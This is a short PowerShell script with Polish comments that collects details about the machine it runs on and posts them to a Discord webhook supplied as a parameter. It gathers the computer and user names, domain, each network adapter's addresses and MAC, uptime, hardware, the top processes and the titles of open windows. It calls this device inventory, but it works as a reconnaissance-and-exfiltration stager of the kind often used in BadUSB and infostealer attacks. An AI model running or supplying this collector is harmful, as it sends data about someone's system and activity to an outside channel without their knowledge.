# get_info.ps1 - Prosty zbieracz informacji dla Discord Webhook
param([string]$webhook)

# Zbieramy podstawowe info
$compName = $env:COMPUTERNAME
$userName = $env:USERNAME
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if (!$domain -or $domain -eq "") { $domain = "BRAK (grupa robocza)" }

# Sieciówki
$networkInfo = ""
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true}
foreach ($adapter in $adapters) {
    $name = (Get-WmiObject Win32_NetworkAdapter | Where-Object {$_.Index -eq $adapter.Index}).Name
    $ip = $adapter.IPAddress[0]
    $mask = $adapter.IPSubnet[0]
    $gw = $adapter.DefaultIPGateway -join ", "
    $dns = $adapter.DNSServerSearchOrder -join ", "
    $mac = $adapter.MACAddress
    
    $networkInfo += "Karta: $name`r`nIP: $ip`r`nMaska: $mask`r`nBrama: $gw`r`nDNS: $dns`r`nMAC: $mac`r`n---`r`n"
}
if ($networkInfo -eq "") { $networkInfo = "Brak połączenia sieciowego" }

# Uptime
$os = Get-WmiObject Win32_OperatingSystem
$uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
$uptimeStr = "$($uptime.Days)d $($uptime.Hours)h $($uptime.Minutes)m"

# Procesor i RAM
$cpu = (Get-WmiObject Win32_Processor).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)

# Procesy
$procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 | ForEach-Object {
    "$($_.ProcessName) (CPU: $([math]::Round($_.CPU,1)) | RAM: $([math]::Round($_.WorkingSet/1MB,1)) MB)"
}
$procsText = $procs -join "`r`n"
if ($procsText -eq "") { $procsText = "Brak" }

# Aktywne okna
$windows = @(Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object -First 5 -ExpandProperty MainWindowTitle)
$windowsText = $windows -join "`r`n"
if ($windowsText -eq "") { $windowsText = "Brak" }

# Tworzymy wiadomość - ZWYKŁY TEKST
$message = @"
**NOWE URZĄDZENIE ZAINWENTARYZOWANE!**

**Komputer:** $compName
**Użytkownik:** $userName
**Domena:** $domain
**Uptime:** $uptimeStr
**CPU:** $cpu
**RAM:** $ram GB

**SIECI:**
$networkInfo

**TOP 5 PROCESÓW:**
$procsText

**AKTYWNE OKNA:**
$windowsText
"@

# Przygotowujemy JSON - tylko content, bez embed
$body = @{
    content = $message
} | ConvertTo-Json

# Wysyłamy na Discord
try {
    Write-Host "Wysyłanie..." -ForegroundColor Yellow
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $body
    Write-Host "OK!" -ForegroundColor Green
} catch {
    Write-Host "Błąd: $_" -ForegroundColor Red
}
